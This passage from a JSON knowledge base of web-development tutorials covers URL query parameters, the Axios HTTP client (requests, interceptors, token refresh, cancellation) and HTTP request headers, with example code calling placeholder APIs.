q=coffee+%26+tea\n   ```\n\n## Common Pitfalls\n\n- Forgetting to URL-encode special characters (`&`, `=`, `?`, spaces, `#`)\n- Not validating/sanitizing query params (security risk: SQL injection, XSS)\n- Using query params for sensitive data (they appear in URLs, logs, browser history)\n- Treating query values as correct types (they're always strings—convert manually)\n- Not handling missing/undefined query params gracefully\n- Building query strings with string concatenation instead of `URLSearchParams`\n\n## Practical Applications\n\n- Search and filtering (e-commerce product filters, search results)\n- Pagination and sorting (data tables, infinite scroll)\n- Analytics and tracking (UTM parameters: `?utm_source=google&utm_campaign=spring`)\n- API versioning and feature flags (`?api_version=2&beta=true`)\n- Sharing application state (shareable filtered views, map coordinates)\n\n## References\n\n- [MDN: URLSearchParams](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams)\n- [MDN: encodeURIComponent](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent)\n- [Express.js: req.query](https://expressjs.com/en/api.html#req.query)\n- [RFC 3986: URI Syntax](https://www.rfc-editor.org/rfc/rfc3986)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Query Params vs Path Params:**\n  - **Path params:** `/users/:id` - Required, identify specific resources (`/users/123`)\n  - **Query params:** `/users?role=admin` - Optional, filter/modify results\n  - Use path params for resource identification, query params for optional filtering\n\n- **Nested Objects in Query Strings:**\n  ```js\n  // qs library (popular for complex params)\n  import qs from 'qs';\n  \n  const params = qs.stringify({\n    filter: { status: 'active', role: 'admin' },\n    sort: { createdAt: 'desc' }\n  });\n  // filter[status]=active&filter[role]=admin&sort[createdAt]=desc\n  \n  // Server parsing\n  const parsed = qs.parse(queryString);\n  // { filter: { status: 'active', role: 'admin' }, sort: { createdAt: 'desc' } }\n  ```\n\n- **Security Considerations:**\n  - Never pass passwords, tokens, or sensitive data in query params\n  - Always validate and sanitize input to prevent injection attacks\n  - Be aware query params are logged in server logs and browser history\n  - Use POST with request body for sensitive/large data\n\n- **Performance & Caching:**\n  - Query params affect browser and CDN caching (different params = different cache entries)\n  - Keep query strings short for better caching and URL sharing\n  - Use consistent param ordering for cache efficiency\n\n- **Best Practices:**\n  ```js\n  // ✅ Good: Descriptive, consistent naming\n  /api/products?category=electronics&sortBy=price&order=asc&page=1\n  \n  // ❌ Bad: Unclear, inconsistent\n  /api/products?cat=elec&s=p&o=a&pg=1\n  \n  // ✅ Good: Type conversion and defaults\n  const page = parseInt(req.query.page) || 1;\n  const limit = Math.min(parseInt(req.query.limit) || 10, 100); // Cap at 100\n  \n  // ✅ Good: Validation\n  const validSortFields = ['price', 'name', 'date'];\n  const sortBy = validSortFields.includes(req.query.sortBy) \n    ? req.query.sortBy \n    : 'date';\n  ```\n\n- **React Router Integration:**\n  ```js\n  import { useSearchParams } from 'react-router-dom';\n  \n  function ProductList() {\n    const [searchParams, setSearchParams] = useSearchParams();\n    const category = searchParams.get('category') || 'all';\n    \n    const updateFilter = (newCategory) => {\n      setSearchParams({ category: newCategory });\n      // URL updates to ?category=electronics\n    };\n  }\n  ```\n\n- **OpenAPI Documentation:**\n  ```yaml\n  paths:\n    /products:\n      get:\n        parameters:\n          - name: category\n            in: query\n            required: false\n            schema:\n              type: string\n          - name: page\n            in: query\n            schema:\n              type: integer\n              minimum: 1\n              default: 1\n  ```"
    },
    {
      "id": "swe/frontend/http/axios",
      "title": "Axios: Complete Overview",
      "path": [
        "swe",
        "frontend",
        "http",
        "axios"
      ],
      "content": "# Axios: Complete Overview\n\nAxios is a promise-based HTTP client for browser and Node.js that simplifies making API requests with features like automatic JSON transformation, interceptors, request/response handling, and error management. Unlike the native `fetch` API, Axios automatically parses JSON responses, provides better error handling, and offers built-in request/response interceptors. Think of Axios as a Swiss Army knife for HTTP requests—while fetch is a basic knife, Axios includes extra tools like automatic transformations, timeout handling, and progress tracking built-in.\n\n## Key Points\n\n- **Promise-Based:** Uses async/await or .then()/.catch()\n- **Auto JSON:** Automatically stringifies requests and parses responses\n- **Interceptors:** Modify requests/responses globally (auth, logging)\n- **Cancellation:** Cancel requests with AbortController\n- **Works Everywhere:** Browser and Node.js\n\n## Installation\n\n```bash\nnpm install axios\n\n# Or with yarn\nyarn add axios\n\n# CDN (browser)\n<script src=\"https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js\"></script>\n```\n\n## Basic Usage\n\n### GET Request\n\n```javascript\nimport axios from 'axios';\n\n// Simple GET\nconst response = await axios.get('https://api.example.com/users');\nconsole.log(response.data); // Parsed JSON automatically\n\n// With query parameters\nconst response = await axios.get('https://api.example.com/users', {\n  params: {\n    page: 1,\n    limit: 10,\n    sort: 'name'\n  }\n});\n// Requests: /users?page=1&limit=10&sort=name\n\n// .then() syntax\naxios.get('https://api.example.com/users')\n  .then(response => console.log(response.data))\n  .catch(error => console.error(error));\n```\n\n### POST Request\n\n```javascript\n// POST with JSON body\nconst newUser = {\n  name: 'John Doe',\n  email: 'john@example.com'\n};\n\nconst response = await axios.post('https://api.example.com/users', newUser);\nconsole.log(response.data); // Created user\n\n// With headers\nconst response = await axios.post(\n  'https://api.example.com/users',\n  newUser,\n  {\n    headers: {\n      'Content-Type': 'application/json',\n      'Authorization': 'Bearer token123'\n    }\n  }\n);\n```\n\n### PUT/PATCH/DELETE\n\n```javascript\n// PUT (full update)\nawait axios.put('https://api.example.com/users/123', {\n  name: 'Jane Doe',\n  email: 'jane@example.com'\n});\n\n// PATCH (partial update)\nawait axios.patch('https://api.example.com/users/123', {\n  name: 'Jane Doe'\n});\n\n// DELETE\nawait axios.delete('https://api.example.com/users/123');\n\n// DELETE with body (uncommon)\nawait axios.delete('https://api.example.com/users/123', {\n  data: { reason: 'User requested deletion' }\n});\n```\n\n## Response Object\n\n```javascript\nconst response = await axios.get('/api/users');\n\nconsole.log(response.data);       // Response body (parsed JSON)\nconsole.log(response.status);     // HTTP status code (200)\nconsole.log(response.statusText); // Status text ('OK')\nconsole.log(response.headers);    // Response headers\nconsole.log(response.config);     // Request config used\nconsole.log(response.request);    // Original XMLHttpRequest\n\n// Example response:\n{\n  data: { id: 1, name: 'John' },\n  status: 200,\n  statusText: 'OK',\n  headers: { 'content-type': 'application/json' },\n  config: { /* request config */ },\n  request: { /* XMLHttpRequest */ }\n}\n```\n\n## Request Configuration\n\n```javascript\n// Full config object\nconst config = {\n  url: '/api/users',\n  method: 'post',\n  baseURL: 'https://api.example.com',\n  \n  // Request headers\n  headers: {\n    'Authorization': 'Bearer token',\n    'Content-Type': 'application/json'\n  },\n  \n  // Query parameters\n  params: {\n    page: 1,\n    limit: 10\n  },\n  \n  // Request body\n  data: {\n    name: 'John'\n  },\n  \n  // Timeout (ms)\n  timeout: 5000,\n  \n  // Response type\n  responseType: 'json', // 'json', 'blob', 'arraybuffer', 'text', 'stream'\n  \n  // Validate status codes\n  validateStatus: (status) => status >= 200 && status < 300,\n  \n  // Max redirects\n  maxRedirects: 5,\n  \n  // Auth credentials\n  auth: {\n    username: 'user',\n    password: 'pass'\n  }\n};\n\nconst response = await axios(config);\n```\n\n## Instance Creation\n\n```javascript\n// Create instance with defaults\nconst api = axios.create({\n  baseURL: 'https://api.example.com',\n  timeout: 5000,\n  headers: {\n    'Content-Type': 'application/json'\n  }\n});\n\n// Use instance\nconst users = await api.get('/users');\nconst user = await api.post('/users', { name: 'John' });\n\n// Multiple instances for different APIs\nconst apiV1 = axios.create({ baseURL: 'https://api.example.com/v1' });\nconst apiV2 = axios.create({ baseURL: 'https://api.example.com/v2' });\n```\n\n## Interceptors\n\n### Request Interceptors\n\n```javascript\n// Add token to all requests\naxios.interceptors.request.use(\n  config => {\n    const token = localStorage.getItem('token');\n    if (token) {\n      config.headers.Authorization = `Bearer ${token}`;\n    }\n    return config;\n  },\n  error => Promise.reject(error)\n);\n\n// Logging\naxios.interceptors.request.use(\n  config => {\n    console.log(`${config.method.toUpperCase()} ${config.url}`);\n    return config;\n  }\n);\n\n// Multiple interceptors\nconst requestInterceptor = axios.interceptors.request.use(config => config);\n\n// Remove interceptor\naxios.interceptors.request.eject(requestInterceptor);\n```\n\n### Response Interceptors\n\n```javascript\n// Handle errors globally\naxios.interceptors.response.use(\n  response => response,\n  error => {\n    if (error.response?.status === 401) {\n      // Redirect to login\n      window.location.href = '/login';\n    }\n    return Promise.reject(error);\n  }\n);\n\n// Transform response data\naxios.interceptors.response.use(\n  response => {\n    // Add timestamp to all responses\n    response.data.fetchedAt = new Date();\n    return response;\n  }\n);\n\n// Auto-retry on failure\naxios.interceptors.response.use(\n  response => response,\n  async error => {\n    const config = error.config;\n    \n    if (!config.retry) config.retry = 0;\n    \n    if (config.retry < 3) {\n      config.retry++;\n      await new Promise(resolve => setTimeout(resolve, 1000));\n      return axios(config);\n    }\n    \n    return Promise.reject(error);\n  }\n);\n```\n\n## Error Handling\n\n```javascript\ntry {\n  const response = await axios.get('/api/users');\n} catch (error) {\n  if (error.response) {\n    // Server responded with error status (4xx, 5xx)\n    console.log('Status:', error.response.status);\n    console.log('Data:', error.response.data);\n    console.log('Headers:', error.response.headers);\n  } else if (error.request) {\n    // Request made but no response (network error)\n    console.log('No response:', error.request);\n  } else {\n    // Error setting up request\n    console.log('Error:', error.message);\n  }\n}\n\n// Specific error handling\ntry {\n  await axios.get('/api/users');\n} catch (error) {\n  if (error.response?.status === 404) {\n    console.log('User not found');\n  } else if (error.response?.status === 500) {\n    console.log('Server error');\n  } else if (error.code === 'ECONNABORTED') {\n    console.log('Request timeout');\n  } else {\n    console.log('Unknown error:', error.message);\n  }\n}\n```\n\n## Cancellation\n\n```javascript\n// Using AbortController\nconst controller = new AbortController();\n\naxios.get('/api/users', {\n  signal: controller.signal\n});\n\n// Cancel request\ncontroller.abort();\n\n// React example - cancel on unmount\nuseEffect(() => {\n  const controller = new AbortController();\n  \n  axios.get('/api/data', { signal: controller.signal })\n    .then(response => setData(response.data))\n    .catch(error => {\n      if (error.name === 'CanceledError') {\n        console.log('Request cancelled');\n      }\n    });\n  \n  return () => controller.abort();\n}, []);\n```\n\n## Concurrent Requests\n\n```javascript\n// Promise.all with axios\nconst [users, posts, comments] = await Promise.all([\n  axios.get('/api/users'),\n  axios.get('/api/posts'),\n  axios.get('/api/comments')\n]);\n\nconsole.log(users.data, posts.data, comments.data);\n\n// With error handling\nconst results = await Promise.allSettled([\n  axios.get('/api/users'),\n  axios.get('/api/posts'),\n  axios.get('/api/comments')\n]);\n\nresults.forEach((result, index) => {\n  if (result.status === 'fulfilled') {\n    console.log(`Request ${index} succeeded:`, result.value.data);\n  } else {\n    console.log(`Request ${index} failed:`, result.reason);\n  }\n});\n```\n\n## File Uploads\n\n```javascript\n// Single file upload\nconst formData = new FormData();\nformData.append('file', fileInput.files[0]);\nformData.append('description', 'Profile picture');\n\nconst response = await axios.post('/api/upload', formData, {\n  headers: {\n    'Content-Type': 'multipart/form-data'\n  },\n  onUploadProgress: (progressEvent) => {\n    const percentCompleted = Math.round(\n      (progressEvent.loaded * 100) / progressEvent.total\n    );\n    console.log(`Upload: ${percentCompleted}%`);\n  }\n});\n\n// Multiple files\nconst formData = new FormData();\nArray.from(fileInput.files).forEach(file => {\n  formData.append('files', file);\n});\n\nawait axios.post('/api/upload-multiple', formData);\n```\n\n## Download Files\n\n```javascript\n// Download as blob\nconst response = await axios.get('/api/files/report.pdf', {\n  responseType: 'blob'\n});\n\n// Create download link\nconst url = window.URL.createObjectURL(new Blob([response.data]));\nconst link = document.createElement('a');\nlink.href = url;\nlink.setAttribute('download', 'report.pdf');\ndocument.body.appendChild(link);\nlink.click();\nlink.remove();\n\n// With progress\nawait axios.get('/api/files/large-file.zip', {\n  responseType: 'blob',\n  onDownloadProgress: (progressEvent) => {\n    const percentCompleted = Math.round(\n      (progressEvent.loaded * 100) / progressEvent.total\n    );\n    console.log(`Download: ${percentCompleted}%`);\n  }\n});\n```\n\n## Authentication Patterns\n\n### JWT Token\n\n```javascript\n// Login and store token\nconst loginResponse = await axios.post('/api/auth/login', {\n  email: 'user@example.com',\n  password: 'password123'\n});\n\nconst token = loginResponse.data.token;\nlocalStorage.setItem('token', token);\n\n// Set default header\naxios.defaults.headers.common['Authorization'] = `Bearer ${token}`;\n\n// Or use interceptor\naxios.interceptors.request.use(config => {\n  const token = localStorage.getItem('token');\n  if (token) {\n    config.headers.Authorization = `Bearer ${token}`;\n  }\n  return config;\n});\n```\n\n### Refresh Token\n\n```javascript\n// Interceptor to refresh token on 401\nlet isRefreshing = false;\nlet failedQueue = [];\n\naxios.interceptors.response.use(\n  response => response,\n  async error => {\n    const originalRequest = error.config;\n    \n    if (error.response?.status === 401 && !originalRequest._retry) {\n      if (isRefreshing) {\n        // Wait for refresh to complete\n        return new Promise((resolve, reject) => {\n          failedQueue.push({ resolve, reject });\n        }).then(token => {\n          originalRequest.headers.Authorization = `Bearer ${token}`;\n          return axios(originalRequest);\n        });\n      }\n      \n      originalRequest._retry = true;\n      isRefreshing = true;\n      \n      try {\n        const refreshToken = localStorage.getItem('refreshToken');\n        const { data } = await axios.post('/api/auth/refresh', { refreshToken });\n        \n        localStorage.setItem('token', data.accessToken);\n        axios.defaults.headers.common['Authorization'] = `Bearer ${data.accessToken}`;\n        \n        // Retry failed requests\n        failedQueue.forEach(({ resolve }) => resolve(data.accessToken));\n        failedQueue = [];\n        \n        return axios(originalRequest);\n      } catch (err) {\n        failedQueue.forEach(({ reject }) => reject(err));\n        failedQueue = [];\n        \n        // Redirect to login\n        window.location.href = '/login';\n        return Promise.reject(err);\n      } finally {\n        isRefreshing = false;\n      }\n    }\n    \n    return Promise.reject(error);\n  }\n);\n```\n\n## Common Patterns\n\n### API Service Layer\n\n```javascript\n// services/api.js\nimport axios from 'axios';\n\nconst api = axios.create({\n  baseURL: process.env.REACT_APP_API_URL,\n  timeout: 10000,\n  headers: {\n    'Content-Type': 'application/json'\n  }\n});\n\n// Request interceptor\napi.interceptors.request.use(config => {\n  const token = localStorage.getItem('token');\n  if (token) {\n    config.headers.Authorization = `Bearer ${token}`;\n  }\n  return config;\n});\n\n// Response interceptor\napi.interceptors.response.use(\n  response => response,\n  error => {\n    if (error.response?.status === 401) {\n      localStorage.removeItem('token');\n      window.location.href = '/login';\n    }\n    return Promise.reject(error);\n  }\n);\n\nexport default api;\n\n// services/userService.js\nimport api from './api';\n\nexport const userService = {\n  getAll: () => api.get('/users'),\n  getById: (id) => api.get(`/users/${id}`),\n  create: (user) => api.post('/users', user),\n  update: (id, user) => api.put(`/users/${id}`, user),\n  delete: (id) => api.delete(`/users/${id}`)\n};\n```\n\n### React Hook\n\n```javascript\n// hooks/useApi.js\nimport { useState, useEffect } from 'react';\nimport axios from 'axios';\n\nexport function useApi(url, options = {}) {\n  const [data, setData] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n  \n  useEffect(() => {\n    const controller = new AbortController();\n    \n    axios.get(url, { ...options, signal: controller.signal })\n      .then(response => {\n        setData(response.data);\n        setError(null);\n      })\n      .catch(err => {\n        if (err.name !== 'CanceledError') {\n          setError(err);\n        }\n      })\n      .finally(() => setLoading(false));\n    \n    return () => controller.abort();\n  }, [url]);\n  \n  return { data, loading, error };\n}\n\n// Usage\nfunction UserList() {\n  const { data: users, loading, error } = useApi('/api/users');\n  \n  if (loading) return <div>Loading...</div>;\n  if (error) return <div>Error: {error.message}</div>;\n  \n  return <ul>{users.map(user => <li key={user.id}>{user.name}</li>)}</ul>;\n}\n```\n\n## Axios vs Fetch\n\n```javascript\n// Fetch\nconst response = await fetch('https://api.example.com/users', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ name: 'John' })\n});\n\nif (!response.ok) throw new Error('Request failed');\nconst data = await response.json();\n\n// Axios (simpler)\nconst { data } = await axios.post('https://api.example.com/users', {\n  name: 'John'\n});\n\n// Axios advantages:\n// - Auto JSON parsing\n// - Throws on error status (no manual check)\n// - Interceptors built-in\n// - Request cancellation simpler\n// - Upload/download progress\n// - Better error handling\n```\n\n## Best Practices\n\n```javascript\n// ✅ Create instance with baseURL\nconst api = axios.create({\n  baseURL: process.env.API_URL,\n  timeout: 10000\n});\n\n// ✅ Use interceptors for auth\naxios.interceptors.request.use(config => {\n  config.headers.Authorization = `Bearer ${getToken()}`;\n  return config;\n});\n\n// ✅ Handle errors globally\naxios.interceptors.response.use(\n  response => response,\n  error => {\n    console.error('API Error:', error.response?.data);\n    return Promise.reject(error);\n  }\n);\n\n// ✅ Cancel requests on component unmount\nuseEffect(() => {\n  const controller = new AbortController();\n  fetchData({ signal: controller.signal });\n  return () => controller.abort();\n}, []);\n\n// ✅ Use timeout for slow endpoints\nawait axios.get('/slow-endpoint', { timeout: 5000 });\n\n// ❌ Don't ignore errors\nawait axios.get('/api/data'); // Missing .catch()\n\n// ❌ Don't set headers on every request\naxios.get('/api/data', {\n  headers: { Authorization: `Bearer ${token}` } // Use interceptor instead\n});\n\n// ❌ Don't forget to cancel long requests\naxios.get('/long-request'); // Should use AbortController\n```\n\n## References\n\n- [Axios Documentation](https://axios-http.com/docs/intro)\n- [Axios GitHub](https://github.com/axios/axios)\n- [Axios API Reference](https://axios-http.com/docs/api_intro)\n\n---\n\n## Summary\n\n**Axios:** Promise-based HTTP client with auto JSON parsing and interceptors.\n\n**Basic Usage:**\n```javascript\nconst { data } = await axios.get('/api/users');\nawait axios.post('/api/users', { name: 'John' });\n```\n\n**Instance:**\n```javascript\nconst api = axios.create({\n  baseURL: 'https://api.example.com',\n  timeout: 5000\n});\n```\n\n**Interceptors:**\n```javascript\n// Request\naxios.interceptors.request.use(config => {\n  config.headers.Authorization = `Bearer ${token}`;\n  return config;\n});\n\n// Response\naxios.interceptors.response.use(\n  response => response,\n  error => handleError(error)\n);\n```\n\n**Cancellation:**\n```javascript\nconst controller = new AbortController();\naxios.get(url, { signal: controller.signal });\ncontroller.abort();\n```\n\n**Rule of thumb:** Create instance with baseURL. Use interceptors for auth/errors. Cancel requests on unmount. Handle errors with try/catch. Prefer axios over fetch for complex apps."
    },
    {
      "id": "swe/frontend/http/headers-http",
      "title": "HTTP Request Headers: Complete Overview",
      "path": [
        "swe",
        "frontend",
        "http",
        "headers-http"
      ],
      "content": "# HTTP Request Headers: Complete Overview\n\nHTTP request headers are key-value pairs sent from client to server containing metadata about the request—who's making it, what they accept, authentication credentials, and more. Headers don't contain the actual data being sent (that's in the body), but rather instructions and context. Think of headers like an envelope's addressing and postage—they tell the postal service how to handle the letter, while the body is the actual letter inside.\n\n## Key Points\n\n- **Format:** `Header-Name: value`\n- **Purpose:** Metadata about request (auth, content type, caching, etc.)\n- **Standard Headers:** Defined by HTTP spec (Authorization, Content-Type)\n- **Custom Headers:** Prefixed with `X-` (deprecated) or custom namespace\n- **Case-Insensitive:** `Content-Type` same as `content-type`\n\n## Common Request Headers\n\n### Content Headers\n\n```http\n# Content-Type: Format of request body\nPOST /api/users HTTP/1.1\nContent-Type: application/json\n\n{\"name\": \"John\", \"email\": \"john@example.com\"}\n\n# Common values:\nContent-Type: application/json           # JSON data\nContent-Type: application/x-www-form-urlencoded  # Form data\nContent-Type: multipart/form-data        # File uploads\nContent-Type: text/html                  # HTML\nContent-Type: text/plain                 # Plain text\n```\n\n```http\n# Content-Length: Size of body in bytes\nPOST /api/users HTTP/1.1\nContent-Type: application/json\nContent-Length: 45\n\n{\"name\": \"John\", \"email\": \"john@example.com\"}\n```\n\n### Accept Headers\n\n```http\n# Accept: What response formats client accepts\nGET /api/users HTTP/1.1\nAccept: application/json\n\n# Multiple formats (preference order)\nAccept: application/json, text/html, */*\n\n# With quality values (q)\nAccept: application/json;q=1.0, text/html;q=0.8, */*;q=0.1\n# Prefers JSON, then HTML, then anything\n```\n\n```http\n# Accept-Encoding: Compression formats accepted\nGET /api/data HTTP/1.1\nAccept-Encoding: gzip, deflate, br\n\n# Accept-Language: Preferred languages\nGET /api/content HTTP/1.1\nAccept-Language: en-US, en;q=0.9, es;q=0.8\n```\n\n### Authentication\n\n```http\n# Authorization: Credentials for authentication\nGET /api/profile HTTP/1.1\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n\n# Common schemes:\nAuthorization: Basic dXNlcjpwYXNzd29yZA==    # Base64(username:password)\nAuthorization: Bearer <token>                # JWT token\nAuthorization: Digest username=\"user\"...     # Digest auth\n```\n\n```http\n# API-Key: Custom authentication (varies by service)\nGET /api/data HTTP/1.1\nAPI-Key: sk_live_123456789\n\n# X-API-Key: Alternative naming\nX-API-Key: your-api-key-here\n```\n\n### Caching\n\n```http\n# Cache-Control: Caching directives\nGET /api/users HTTP/1.1\nCache-Control: no-cache          # Revalidate before using cache\nCache-Control: no-store          # Don't cache at all\nCache-Control: max-age=3600      # Cache for 1 hour\n\n# If-None-Match: Conditional request with ETag\nGET /api/users HTTP/1.1\nIf-None-Match: \"33a64df551425fcc55e4d42a148795d9f25f89d4\"\n# Server returns 304 Not Modified if ETag matches\n\n# If-Modified-Since: Conditional request with date\nGET /api/users HTTP/1.1\nIf-Modified-Since: Wed, 21 Oct 2023 07:28:00 GMT\n# Server returns 304 if not modified since date\n```\n\n### Origin/Referer\n\n```http\n# Origin: Source of request (CORS)\nPOST /api/users HTTP/1.1\nOrigin: https://example.com\n\n# Referer: Previous page URL\nGET /page2 HTTP/1.1\nReferer: https://example.com/page1\n\n# Note: \"Referer\" is misspelled in spec (should be \"Referrer\")\n```\n\n### User Agent\n\n```http\n# User-Agent: Client identifier (browser, OS, device)\nGET /api/data HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n\n# Mobile example:\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)\n\n# Custom client:\nUser-Agent: MyApp/1.0 (https://myapp.com)\n```\n\n### Connection\n\n```http\n# Connection: Control connection behavior\nGET /api/data HTTP/1.1\nConnection: keep-alive    # Reuse connection (default in HTTP/1.1)\nConnection: close         # Close after response\n\n# Host: Required in HTTP/1.1 (target server)\nGET /api/users HTTP/1.1\nHost: api.example.com\n```\n\n## Custom Headers\n\n```http\n# Custom application headers (no standard prefix needed)\nGET /api/data HTTP/1.1\nX-Request-ID: abc-123-def-456      # Request tracking\nX-Correlation-ID: xyz-789          # Distributed tracing\nX-Client-Version: 2.1.0            # Client version\nX-Feature-Flag: new-ui-enabled     # Feature toggles\n\n# Modern convention: Skip X- prefix\nRequest-ID: abc-123-def-456\nClient-Version: 2.1.0\n```\n\n## Setting Headers in Code\n\n### JavaScript (Fetch)\n\n```javascript\n// Basic headers\nfetch('https://api.example.com/users', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'Authorization': 'Bearer token123'\n  },\n  body: JSON.stringify({ name: 'John' })\n});\n\n// Multiple headers\nconst headers = new Headers();\nheaders.append('Content-Type', 'application/json');\nheaders.append('X-Custom-Header', 'value');\n\nfetch('https://api.example.com/data', { headers });\n```\n\n### Axios\n\n```javascript\n// Global defaults\naxios.defaults.headers.common['Authorization'] = 'Bearer token123';\naxios.defaults.headers.post['Content-Type'] = 'application/json';\n\n// Per-request\naxios.post('/api/users', data, {\n  headers: {\n    'Content-Type': 'application/json',\n    'X-Request-ID': generateId()\n  }\n});\n\n// Interceptor (all requests)\naxios.interceptors.request.use(config => {\n  config.headers['Authorization'] = `Bearer ${getToken()}`;\n  return config;\n});\n```\n\n### cURL\n\n```bash\n# Single header\ncurl -H \"Authorization: Bearer token123\" https://api.example.com/users\n\n# Multiple headers\ncurl -H \"Content-Type: application/json\" \\\n     -H \"Authorization: Bearer token123\" \\\n     -d '{\"name\":\"John\"}' \\\n     https://api.example.com/users\n\n# From file\ncurl -H @headers.txt https://api.example.com/data\n```\n\n### Node.js (http module)\n\n```javascript\nconst http = require('http');\n\nconst options = {\n  hostname: 'api.example.com',\n  path: '/users',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'Authorization': 'Bearer token123',\n    'Content-Length': Buffer.byteLength(data)\n  }\n};\n\nconst req = http.request(options, (res) => {\n  // Handle response\n});\n```\n\n### Express (Server-side)\n\n```javascript\n// Reading request headers\napp.get('/api/data', (req, res) => {\n  const authHeader = req.headers.authorization;\n  const userAgent = req.headers['user-agent'];\n  const customHeader = req.get('X-Custom-Header');\n  \n  console.log(req.headers); // All headers\n});\n\n// Setting response headers\napp.get('/api/data', (req, res) => {\n  res.set('X-Response-Time', '123ms');\n  res.set({\n    'Cache-Control': 'no-cache',\n    'X-Custom': 'value'\n  });\n  res.send(data);\n});\n```\n\n## CORS Headers\n\n```http\n# Request (from browser)\nOPTIONS /api/users HTTP/1.1\nOrigin: https://frontend.com\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: Content-Type, Authorization\n\n# Response (from server)\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://frontend.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 86400\n```\n\n```javascript\n// Express CORS middleware\napp.use((req, res, next) => {\n  res.set('Access-Control-Allow-Origin', '*');\n  res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');\n  res.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');\n  next();\n});\n\n// Or use cors package\nconst cors = require('cors');\napp.use(cors({\n  origin: 'https://frontend.com',\n  methods: ['GET', 'POST'],\n  allowedHeaders: ['Content-Type', 'Authorization']\n}));\n```\n\n## Security Headers\n\n```http\n# Request headers for security\n\n# Cookie: Send cookies with request\nGET /api/profile HTTP/1.1\nCookie: sessionId=abc123; userId=456\n\n# X-CSRF-Token: CSRF protection\nPOST /api/users HTTP/1.1\nX-CSRF-Token: csrf-token-here\nContent-Type: application/json\n```\n\n## Common Patterns\n\n### JWT Authentication\n\n```javascript\n// Store token\nlocalStorage.setItem('token', jwtToken);\n\n// Send with every request\nfetch('/api/data', {\n  headers: {\n    'Authorization': `Bearer ${localStorage.getItem('token')}`\n  }\n});\n\n// Axios interceptor\naxios.interceptors.request.use(config => {\n  const token = localStorage.getItem('token');\n  if (token) {\n    config.headers.Authorization = `Bearer ${token}`;\n  }\n  return config;\n});\n```\n\n### Request Tracking\n\n```javascript\n// Generate unique ID per request\nfunction generateRequestId() {\n  return `${Date.now()}-${Math.random().toString(36)}`;\n}\n\nfetch('/api/data', {\n  headers: {\n    'X-Request-ID': generateRequestId(),\n    'X-Client-Version': '1.2.3'\n  }\n});\n\n// Server logs request ID for debugging\napp.use((req, res, next) => {\n  const requestId = req.headers['x-request-id'];\n  console.log(`[${requestId}] ${req.method} ${req.path}`);\n  next();\n});\n```\n\n### Content Negotiation\n\n```javascript\n// Request JSON or XML based on user preference\nconst format = user.preferredFormat;\n\nfetch('/api/data', {\n  headers: {\n    'Accept': format === 'xml' \n      ? 'application/xml' \n      : 'application/json'\n  }\n});\n\n// Server responds with requested format\napp.get('/api/data', (req, res) => {\n  if (req.accepts('json')) {\n    res.json(data);\n  } else if (req.accepts('xml')) {\n    res.type('xml').send(toXML(data));\n  }\n});\n```\n\n## Debugging Headers\n\n```javascript\n// Browser DevTools\n// Network tab → Select request → Headers tab\n\n// Log all request headers (fetch)\nfetch('/api/data', {\n  headers: myHeaders\n}).then(res => {\n  console.log('Request headers:', myHeaders);\n  console.log('Response headers:', res.headers);\n});\n\n// Proxy tool (Charles, Fiddler)\n// Intercept and inspect all headers\n\n// cURL with verbose output\ncurl -v https://api.example.com/data\n# Shows all headers sent and received\n```\n\n## Best Practices\n\n```javascript\n// ✅ Use standard headers when available\nheaders: {\n  'Content-Type': 'application/json',      // Standard\n  'Authorization': 'Bearer token'          // Standard\n}\n\n// ✅ Set appropriate Content-Type\nfetch('/api/users', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify(data)\n});\n\n// ✅ Include authentication\nheaders: {\n  'Authorization': `Bearer ${token}`\n}\n\n// ✅ Add request tracking\nheaders: {\n  'X-Request-ID': generateId(),\n  'X-Client-Version': version\n}\n\n// ❌ Don't send sensitive data in headers (except Authorization)\nheaders: {\n  'X-Password': password  // ❌ Never do this\n}\n\n// ❌ Don't ignore CORS headers\n// Configure server properly\n\n// ❌ Don't hardcode tokens\nheaders: {\n  'Authorization': 'Bearer abc123'  // ❌ Use env vars\n}\n```\n\n## References\n\n- [MDN: HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)\n- [HTTP Header Registry](https://www.iana.org/assignments/http-fields/http-fields.xhtml)\n- [CORS Specification](https://fetch.spec.whatwg.org/#http-cors-protocol)\n\n---\n\n## Summary\n\n**HTTP Headers:** Key-value metadata sent with requests.\n\n**Common Headers:**\n- `Content-Type`: Format of body (`application/json`)\n- `Authorization`: Auth credentials (`Bearer token`)\n- `Accept`: Accepted response formats\n- `User-Agent`: Client identifier\n\n**Setting Headers:**\n```javascript\nfetch(url, {\n  headers: {\n    'Content-Type': 'application/json',\n    'Authorization': `Bearer ${token}`\n  }\n});\n```\n\n**Custom Headers:**\n```javascript\n'X-Request-ID': generateId()\n'X-Custom-Header': 'value'\n```\n\n**Rule of thumb:** Use standard headers when available. Always set `Content-Type` for POST/PUT. Include `Authorization` for protected endpoints. Add custom headers for tracking/debugging. Don't send sensitive data except in `Authorization`."
    },
    {
      "id": "swe/frontend/misc/package.json",
      "title": "package.json and package-lock.json: A Concise Overview",
      "path": [
        "swe",
        "frontend",
        "misc",
        "package.json"
      ],
